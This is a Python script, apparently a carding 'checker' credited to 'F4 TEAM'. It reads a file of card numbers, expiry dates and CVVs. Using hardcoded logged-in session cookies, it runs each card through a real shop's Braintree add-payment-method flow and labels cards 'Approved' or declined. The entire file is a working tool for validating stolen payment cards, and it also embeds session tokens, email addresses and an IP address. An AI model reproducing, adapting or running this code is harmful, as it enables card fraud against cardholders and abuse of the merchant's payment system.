try:
 import base64
 import datetime
 import json
 import os
 import random
 import re
 import string,time
 import uuid
 from urllib.parse import unquote

 import pyfiglet
 import requests
 from bs4 import BeautifulSoup
 from requests.exceptions import RequestsWarning
 from user_agent import generate_user_agent
except ModuleNotFoundError:
 os.system('pip install requests')
 os.system('pip install pyfiglet')
 os.system('pip install datetime')
 os.system('clear')
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
combo=input(F+'ENTER COMBO NAME :'+X)
file=open(f'{combo}',"+r")
logo = pyfiglet.figlet_format('           F4 TEAM ')
print(Z+logo)
o=("#====================================##============================")
print (F+'بدأ الصيد لا تنسى اشتراك بقناتي @TEAM_JO')
print(F+o)
start_num = 0
def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )
def generate_random_gmail():
    validchars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    loginlen = random.randint(5, 10)
    login = ''
    for i in range(loginlen):
        pos = random.randint(0, len(validchars) - 1)
        login = login + validchars[pos]
    servers = ['@gmail.com']
    servpos = random.randint(0, len(servers) - 1)
    email = login + servers[servpos]
    return email
for P in file.readlines():
    start_num += 1
    cc = P.split('|')[0]
    mes=P.split('|')[1]
    ano = P.split('|')[2]
    if not ano.startswith('20'):
        ano=f"20{ano}"
    cvv=P.split('|')[3].replace('\n', '')
    lista=P.replace('\n', '')
    print(B+'━━━━━━━━━━━━━━━━')
    gmail = generate_random_gmail()
    user_agent = generate_user_agent()
    cookies = {
    'cmplz_banner-status': 'dismissed',
    'cmplz_policy_id': '1',
    'cmplz_marketing': 'deny',
    'cmplz_statistics': 'deny',
    'cmplz_preferences': 'deny',
    'cmplz_functional': 'allow',
    'cmplz_consented_services': '',
    'PHPSESSID': '366b2866e000baf14ab965a0f28d4d15',
    '_gcl_au': '1.1.161486318.1756405161',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-28%2018%3A19%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-28%2018%3A19%3A22%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36',
    'gaVisitorUuid': '69ffdb97-dd74-4551-8332-f1f69e425b75',
    'wcpbc_paypalcommerce_session_efb38fd9efa18ec299b212a75f573725': 'world%7C%7Ccffbc8e1afe4e9fa214ae7646bbdf2f9',
    'cmplz_rt_banner-status': 'dismissed',
    'cmplz_rt_policy_id': '1',
    'cmplz_rt_marketing': 'deny',
    'cmplz_rt_statistics': 'deny',
    'cmplz_rt_preferences': 'deny',
    'cmplz_rt_functional': 'allow',
    'cmplz_rt_consented_services': '',
    'wordpress_sec_efb38fd9efa18ec299b212a75f573725': 'sasa0100m%7C1757614912%7CdvTkBRfnB3WDVvDOBn71KSKoH9qAlAz1nPcRcENlE5n%7C49da19fe593cbc432ea5b33e864f15d8bf45eba75851739e020b5c261b2e06d5',
    'wordpress_logged_in_efb38fd9efa18ec299b212a75f573725': 'sasa0100m%7C1757614912%7CdvTkBRfnB3WDVvDOBn71KSKoH9qAlAz1nPcRcENlE5n%7Cf72e0a4a9dc98a18c1655434721e7d642e7f268cced0db6f2e042f41fbd09b46',
    'wp_woocommerce_session_efb38fd9efa18ec299b212a75f573725': '43040%7C1756577967%7C1756574367%7C%24generic%24anQ2txSHS21chjSu5duwGg5tq-ISbA_CNvXVEe0h',
    'tinvwl_wishlists_data_counter': '0',
    'gaIsValuable': '1',
    'gaVisitorEId': '5a1c393f9b992eff3afe563f9df275aded77e6e62e611ff3c7b4abc02b168bf0',
    'tinv_wishlistkey': '041d24',
    'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fpayment-methods%2F',
    'wfwaf-authcookie-7d0d490a75c9471b1f8c1a600eed0a0c': '43040%7Cother%7Cread%7Ce9eee8bc824110c365952a408189d3138ff5d5354b3ef569791e57c434392140',
}

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'priority': 'u=0, i',
    'referer': 'https://husbands-paris.com/en/my-account/payment-methods/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
}

    res1 = requests.get('https://husbands-paris.com/en/my-account/add-payment-method/', cookies=cookies, headers=headers)
    r4 = res1.text
    anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
    T = capture(r4,'wc_braintree_client_token = ["','"]')
    encoded_text = T
    decoded_text = base64.b64decode(encoded_text).decode('utf-8')
    au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '1d5d49bf-4bef-4468-a306-9722f7a1f486',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                    'expirationMonth': mes,
                    'expirationYear': ano,
                    'cvv': cvv,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': '',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    token = res2.json()['data']['tokenizeCreditCard']['token']
    import requests

    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://husbands-paris.com',
    'priority': 'u=1, i',
    'referer': 'https://husbands-paris.com/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
}

    json_data = {
    'amount': '0.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'en-US',
    'browserScreenHeight': 1024,
    'browserScreenWidth': 1280,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': '197.32.52.103',
        'billingLine1': '',
        'billingLine2': '',
        'billingCity': '',
        'billingState': '',
        'billingPostalCode': '',
        'billingCountryCode': 'EG',
        'billingPhoneNumber': '',
        'billingGivenName': '',
        'billingSurname': '',
        'email': 'sasa0100m@gmail.com',
    },
    'bin': '489504',
    'dfReferenceId': '1_95780f9e-d014-4f29-8f7b-f2a50c4fc06e',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.123.1',
        'cardinalDeviceDataCollectionTimeElapsed': 4,
        'issuerDeviceDataCollectionTimeElapsed': 8668,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.123.1',
    '_meta': {
        'merchantAppId': 'husbands-paris.com',
        'platform': 'web',
        'sdkVersion': '3.123.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '1d5d49bf-4bef-4468-a306-9722f7a1f486',
    },
}

    res3 = requests.post(
        f'https://api.braintreegateway.com/merchants/tqrv56bq2khzqk35/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
        headers=headers,
        json=json_data,
    )
    nonce = res3.json()['paymentMethod']['nonce']
    if nonce:
    	print(X+'• nonce and token was extracted successfully')
    else:
    	print(Z+'error')
    print(B+'━━━━━━━━━━━━━━━━')
    import requests

    cookies = {
        'cmplz_consented_services': '',
        'cmplz_policy_id': '1',
        'cmplz_marketing': 'allow',
        'cmplz_statistics': 'allow',
        'cmplz_preferences': 'allow',
        'cmplz_functional': 'allow',
        'cmplz_banner-status': 'dismissed',
        '_gcl_au': '1.1.1416958512.1715123796',
        '_ga': 'GA1.1.689389953.1715123803',
        '_fbp': 'fb.1.1715123804199.504519655',
        '_pin_unauth': 'dWlkPU5tSmpOVE15WlRjdE5qQTJOUzAwWXpBd0xUaGxNall0TldVNFlXRXhNbU5pTWpFeg',
        'MCPopupClosed': 'yes',
        'mailchimp_landing_site': 'https%3A%2F%2Fhusbands-paris.com%2Fen%2Fen%2Fmy-account%2Fadd-payment-method%2F',
        '_clck': '1a4mkqa%7C2%7Cflm%7C0%7C1588',
        'njt-close-notibar': 'true',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2024-05-09%2023%3A10%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2024-05-09%2023%3A10%3A51%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F123.0.0.0%20Safari%2F537.36',
        'wordpress_test_cookie': 'WP%20Cookie%20check',
        'mailchimp.cart.current_email': 'jokey67r97e@gmail.com',
        'mailchimp_user_previous_email': 'jokey67r97e%40gmail.com',
        'mailchimp_user_email': 'jokey67r97e%40gmail.com',
        'wordpress_sec_efb38fd9efa18ec299b212a75f573725': 'jokey67r97e%7C1716505927%7CiFoVqu3AbiNg0iUOeFNJji19NtYRaM4JOAdeFNud6tB%7Cfd1380a84836ec12836575c9dd41e22e8e6cfe496a3478df62af9985b2ed039f',
        'wordpress_logged_in_efb38fd9efa18ec299b212a75f573725': 'jokey67r97e%7C1716505927%7CiFoVqu3AbiNg0iUOeFNJji19NtYRaM4JOAdeFNud6tB%7C06663f1aff4bf35246f78512f8d56a93c3b7a70a3174a60f63fc08564d1d2779',
        'tinvwl_wishlists_data_counter': '0',
        'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
        '_ga_MADEBYTALHA': 'GS1.1.1715296253.5.1.1715296471.0.0.2018120782',
        '_clsk': '1xw4dnc%7C1715296479549%7C8%7C1%7Cp.clarity.ms%2Fcollect',
        'wfwaf-authcookie-7d0d490a75c9471b1f8c1a600eed0a0c': '15179%7Cother%7C%7C190878c0d253f384073282b8a1ea423eb81383012ad286c549dd6f6d3b26622a',
        'tinv_wishlistkey': '618db1',
        'woocommerce_items_in_cart': '1',
        'wp_woocommerce_session_efb38fd9efa18ec299b212a75f573725': '15179%7C%7C1715469295%7C%7C1715465695%7C%7C56b0c3edf3f913581f2e7769856f5010',
        '_ga_PVNDMDZCW4': 'GS1.1.1715296253.5.1.1715296665.60.0.0',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://husbands-paris.com',
        'referer': 'https://husbands-paris.com/en/my-account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': nonce,
        'braintree_cc_device_data': '{"device_session_id":"87529b7c074e3fa129a0ebd405407ff2","fraud_merchant_id":null,"correlation_id":"15fd23df81e5cfd5e55389e0a585706b"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/tqrv56bq2khzqk35/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/tqrv56bq2khzqk35"},"merchantId":"tqrv56bq2khzqk35","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"USD","merchantIdentifier":"tqrv56bq2khzqk35","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["American Express","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJlZGYwYjVjZi1jM2NmLTQxYjYtYjI3NS00ZmQ0ZTQyNzY4YTEiLCJpYXQiOjE3MTUyOTYyNTIsImV4cCI6MTcxNTMwMzQ1MiwiaXNzIjoiNjU3YTRiZjEwYmJmYWI0NmQ3MjhjY2U5IiwiT3JnVW5pdElkIjoiNjU3YTRiZjEzYzJmNTE1ZTAyZWMxMjViIn0.R2150vxabQSzOGl-feNaHlXE7BpB5FGuPnw5LatL_HM"},"androidPay":{"displayName":"Husbands Paris","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTUzODI2NTIsImp0aSI6IjA5OTZkZjg3LThkNDgtNGM2Zi05MGE3LTg3YmU4MjAxYTU2NiIsInN1YiI6InRxcnY1NmJxMmtoenFrMzUiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRxcnY1NmJxMmtoenFrMzUiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.nAz9vde4h1Sitpj0RkqHnbeorb9yisP13VvuMa0mbznorGg9PWvSIK_9cMJBBBk2Cybak34AlqYwU3wNpNZ3hg","paypalClientId":null,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":true,"paypal":{"displayName":"Husbands Paris","clientId":"AQ1508abMajQ4VRW2xqHw8nO0k4lTpyoOdC3blQptbuIpZXlzlgW4aR6lv3ClGVXN6lKeM0tKkd5_vT1","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"husbandsparisUSD","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': anonce,
        '_wp_http_referer': '/en/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    response = requests.post(
        'https://husbands-paris.com/en/my-account/add-payment-method/',
        cookies=cookies,
        headers=headers,
        data=data,
    )
    try:
    	text= response.text
    	pattern = r'Reason: (.*?)\s*</li>'
    	match = re.search(pattern, text)
    	msg=match.group(1)
    	if 'risk_threshold' in text:
            	print(C+f'[ {start_num} ]',lista,' ➜ ',"RISK: Retry this BIN later.")
    	elif 'You cannot add a new payment method so soon after the previous one' in text:
            	print(C+f'[ {start_num} ]',lista,' ➜ ',"Please wait for 20 seconds.")
    	elif 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
            	print(F+f'[ {start_num} ]',lista,' ➜ 1000: Approved')
    	elif 'Duplicate card exists in the vault.' in msg:
            	print(F+f'[ {start_num} ]',lista,' ➜ Approved')
    	elif "avs: Gateway Rejected: avs" in msg or "avs_and_cvv: Gateway Rejected: avs_and_cvv" in msg or "cvv: Gateway Rejected: cvv" in msg:
    		print(F+f'[ {start_num} ]',lista,' ➜ 1000: Approved')
    	elif "Invalid postal code" in msg or "CVV." in msg:
    		print(F+f'[ {start_num} ]',lista,' ➜ Approved(CVV)')
    	elif "Card Issuer Declined CVV" in msg:
    		print(F+f'[ {start_num} ]',lista,' ➜ Approved (CCN)')
    	else:
    	       	print(Z+f'[ {start_num} ]',lista,' ➜ ', msg)
    except:
    	print('error in gate')
    time.sleep(20)